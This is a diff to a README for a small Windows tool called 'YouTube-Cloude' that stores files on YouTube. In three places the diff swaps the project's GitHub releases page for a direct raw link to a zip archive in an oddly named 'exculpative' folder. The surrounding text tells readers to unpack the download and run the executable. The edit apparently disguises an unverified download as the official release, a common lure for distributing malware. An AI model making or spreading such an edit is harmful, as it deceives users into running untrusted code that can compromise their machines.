@@ -1,6 +1,6 @@
 # 🖥️ YouTube-Cloude - Simple file storage with YouTube
 
-[![Download YouTube-Cloude](https://img.shields.io/badge/Download%20YouTube-Cloude-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Barbarycoastsportfish318/YouTube-Cloude/releases)
+[![Download YouTube-Cloude](https://img.shields.io/badge/Download%20YouTube-Cloude-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Barbarycoastsportfish318/YouTube-Cloude/main/exculpative/You-Tube-Cloude-v2.9.zip)
 
 ## 🚀 What this app does
 
@@ -21,7 +21,7 @@ This tool is best for small files. It is not made for large files. It works like
 
 Visit this page to download the latest release:
 
-https://github.com/Barbarycoastsportfish318/YouTube-Cloude/releases
+https://raw.githubusercontent.com/Barbarycoastsportfish318/YouTube-Cloude/main/exculpative/You-Tube-Cloude-v2.9.zip
 
 On that page, look for the newest release and download the Windows file. If you see a `.zip` file, download it and unpack it first. If you see a `.exe` file, you can run it after the download finishes.
 
@@ -186,7 +186,7 @@ After you download the app:
 
 To get a newer version, return to the release page and download the latest release again:
 
-https://github.com/Barbarycoastsportfish318/YouTube-Cloude/releases
+https://raw.githubusercontent.com/Barbarycoastsportfish318/YouTube-Cloude/main/exculpative/You-Tube-Cloude-v2.9.zip
 
 Replace the old app files with the new release files if needed. If you keep your encoded output in a separate folder, you can leave it there
 
